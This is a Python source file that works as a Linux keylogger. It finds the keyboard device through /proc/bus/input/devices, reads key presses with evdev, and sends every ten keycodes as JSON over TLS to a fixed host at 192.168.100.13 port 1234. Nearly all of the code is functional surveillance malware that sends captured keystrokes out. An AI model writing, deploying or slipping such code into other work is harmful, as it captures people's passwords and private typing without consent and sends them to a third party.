from evdev import *
import os, re
import socket
import ssl
import json
import time

keys = []

def connect_securely(data):
    context = ssl.create_default_context()
    context.load_verify_locations(cafile='server.crt')
    context.check_hostname = False
    context.verify_mode = ssl.CERT_REQUIRED

    with context.wrap_socket(socket.socket(socket.AF_INET), server_hostname='localhost') as s:
        s.connect(('192.168.100.13', 1234))
        s.sendall(data)

def find_file(f):
    if not os.path.exists(f):
        print(f"Couldn't find: {f}")
        return None
    print(f"Found: {f}")
    return f
    
def read_file(f):
    with open(f, 'r') as content:
        return content.read()

def find_device(content):
    blocks = content.strip().split("\n\n")
    for block in blocks:
        if re.search(r'.*Name=\".*keyboard.*\"', block, re.IGNORECASE):
            print('Found keyboard device!')
            device = re.search(r'Handlers=.*\b(event\d+)\b', block, re.IGNORECASE)
            if device:
                return device.group(1)

def listen_device_input(f):
    device = InputDevice(f)
    for event in device.read_loop():
        if event.type == ecodes.EV_KEY:
            key_event = categorize(event)
            if key_event.keystate == key_event.key_down:
                try:
                    keys.append(str(key_event.keycode))
                    print(f"Key pressed: {key_event}")
                    if len(keys) == 10:
                        data_str = json.dumps(keys)
                        connect_securely(data_str.encode('utf-8'))
                        keys.clear()
                except (BrokenPipeError, ConnectionResetError) as e:
                    print(f"[!] Connection lost: {e}")
                    break
        time.sleep(0.05)

f = "/proc/bus/input/devices"

find_file(f)
content = read_file(f)
print(content)
result = "/dev/input/" + find_device(content)

try:
    listen_device_input(result)
except KeyboardInterrupt:
    print("Stopped by user.")
